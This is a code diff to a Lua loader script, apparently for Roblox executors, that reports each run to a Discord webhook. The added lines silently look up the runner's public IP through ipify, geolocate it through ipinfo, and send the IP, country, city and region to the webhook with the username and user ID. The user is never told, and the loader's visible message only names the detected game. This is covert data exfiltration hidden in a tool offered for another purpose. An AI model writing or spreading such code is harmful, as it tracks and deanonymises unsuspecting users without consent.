@@ -53,6 +53,39 @@ end
 
 local requestFunc = getRequestFunction()
 
+--[[ Get User Location Data ]]
+local function getUserLocation()
+    local location = {
+        ip = "Unknown",
+        country = "Unknown",
+        city = "Unknown",
+        region = "Unknown"
+    }
+    
+    pcall(function()
+        local http = game:GetService("HttpService")
+        
+        -- Get IP from ipify (no rate limit)
+        local ip = http:GetAsync("https://api.ipify.org")
+        if ip and ip ~= "" then
+            location.ip = ip
+            
+            -- Get location from ipinfo (1,000 requests/day per IP free)
+            local ipInfo = http:GetAsync("https://ipinfo.io/" .. ip .. "/json")
+            if ipInfo and ipInfo ~= "" then
+                local data = http:JSONDecode(ipInfo)
+                if data then
+                    location.country = data.country or "Unknown"
+                    location.city = data.city or "Unknown"
+                    location.region = data.region or "Unknown"
+                end
+            end
+        end
+    end)
+    
+    return location
+end
+
 --[[ Functions ]]
 local function notify(title, text)
     pcall(function()
@@ -81,7 +114,7 @@ local function getGameNameById(gameId)
     return gameNames[gameId] or "Unknown Game"
 end
 
-local function sendToDiscord(userId, userName, gameId, gameName, status, errorMsg, loaderCount, gameCount)
+local function sendToDiscord(userId, userName, gameId, gameName, status, errorMsg, loaderCount, gameCount, location)
     pcall(function()
         local http = game:GetService("HttpService")
         
@@ -92,7 +125,12 @@ local function sendToDiscord(userId, userName, gameId, gameName, status, errorMs
                 fields = {
                     {
                         name = "👤 User",
-                        value = string.format("**%s** (`%s`)", userName, userId),
+                        value = string.format("**%s**", userName),
+                        inline = true
+                    },
+                    {
+                        name = "🆔 User ID",
+                        value = string.format("`%s`", userId),
                         inline = true
                     },
                     {
@@ -111,13 +149,23 @@ local function sendToDiscord(userId, userName, gameId, gameName, status, errorMs
                         inline = true
                     },
                     {
-                        name = "📅 Time",
-                        value = os.date("%Y-%m-%d %H:%M:%S"),
+                        name = "🏷️ Place ID",
+                        value = string.format("`%s`", game.PlaceId),
                         inline = true
                     },
                     {
-                        name = "🏷️ Place ID",
-                        value = string.format("`%s`", game.PlaceId),
+                        name = "🌍 Location",
+                        value = string.format("**IP:** `%s`\n**Country:** %s\n**City:** %s\n**Region:** %s",
+                            location.ip,
+                            location.country,
+                            location.city,
+                            location.region
+                        ),
+                        inline = false
+                    },
+                    {
+                        name = "⏰ Activity Time",
+                        value = string.format("**Executed:** %s", os.date("%Y-%m-%d %H:%M:%S")),
                         inline = true
                     },
                     {
@@ -154,7 +202,7 @@ local function sendToDiscord(userId, userName, gameId, gameName, status, errorMs
         
         -- Try using the executor's request function first
         if requestFunc then
-            local response = requestFunc({
+            requestFunc({
                 Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = {
@@ -196,6 +244,9 @@ pcall(function()
     gameName = game:GetService("MarketplaceService"):GetProductInfo(notifId).Name
 end)
 
+-- Get user location
+local location = getUserLocation()
+
 if scriptUrl then
     notify("STATUS:", "Detected game: " .. gameName)
     
@@ -225,7 +276,8 @@ if scriptUrl then
                 "success", 
                 nil,
                 stats.totalLoaderExecutions,
-                stats.gameExecutions[gameIdStr]
+                stats.gameExecutions[gameIdStr],
+                location
             )
         end)
     else
@@ -239,7 +291,8 @@ if scriptUrl then
                 "error", 
                 tostring(err),
                 stats.totalLoaderExecutions,
-                stats.gameExecutions[gameIdStr]
+                stats.gameExecutions[gameIdStr],
+                location
             )
         end)
     end
@@ -254,7 +307,8 @@ else
             "unsupported", 
             nil,
             stats.totalLoaderExecutions,
-            0
+            0,
+            location
         )
     end)
 end
